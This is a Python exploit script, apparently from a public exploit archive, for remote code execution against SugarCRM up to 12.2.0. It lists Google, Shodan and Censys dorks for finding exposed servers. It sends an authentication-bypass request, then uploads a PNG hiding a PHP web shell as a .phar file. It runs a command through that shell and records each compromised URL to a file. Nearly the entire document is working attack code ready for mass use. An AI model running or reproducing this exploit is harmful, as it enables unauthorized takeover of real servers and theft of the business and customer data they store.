#!/usr/bin/env python

# Exploit Title: SugarCRM 12.2.0 - Remote Code Execution (RCE)
# Exploit Author: sw33t.0day
# Vendor Homepage: https://www.sugarcrm.com
# Version: all commercial versions up to 12.2.0

# Dorks:
# https://www.google.com/search?q=site:sugarondemand.com&filter=0
# https://www.google.com/search?q=intitle:"SugarCRM"+inurl:index.php
# https://www.shodan.io/search?query=http.title:"SugarCRM"
# https://search.censys.io/search?resource=hosts&q=services.http.response.html_title:"SugarCRM"
# https://search.censys.io/search?resource=hosts&q=services.http.response.headers.content_security_policy:"*.sugarcrm.com"

import base64, re, requests, sys, uuid

requests.packages.urllib3.disable_warnings()

if len(sys.argv) != 2:
	sys.exit("Usage: %s [URL]" % sys.argv[0])
	

url     = sys.argv[1] + "/index.php"
session = {"PHPSESSID": str(uuid.uuid4())}
params  = {"module": "Users", "action": "Authenticate", "user_name": 1, "user_password": 1}

requests.post(url, cookies=session, data=params, verify=False)


png_sh = "iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAMAAABPqWaPAAAAS1BMVEU8P3BocCBlY2hvICIjIyMjIyI7IHBhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJjIl0uIiAyPiYxIikpOyBlY2hvICIjIyMjIyI7ID8+IPYYeDcAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAqSURBVCiRY2DADRiZmFlY2dg5OLm4eXj5+AUEhYRFRMXEJfBoGQVDFAAAML4BLUweWhIAAAAASUVORK5CYII="
upload = {"file": ("sweetyas.phar", base64.b64decode(png_sh), "image/png")} # you can also try with other extensions like .php7 .php5 or .phtml
params = {"module": "EmailTemplates", "action": "AttachFiles"}

requests.post(url, cookies=session, data=params, files=upload, verify=False, timeout=120)

url = sys.argv[1] + "/cache/images/sweetyas.phar"


cmd = "ls"
data_bytes = cmd.encode("utf-8")
res = requests.post(url, data={"c": base64.b64encode(data_bytes)}, verify=False)
res = re.search("#####(.*)#####", res.text, re.DOTALL)
if res:
	with open('1.txt', 'a') as file:
		file.write(url+'\n')
	file.close()
else:
	sys.exit("\n[+] Failure!\n")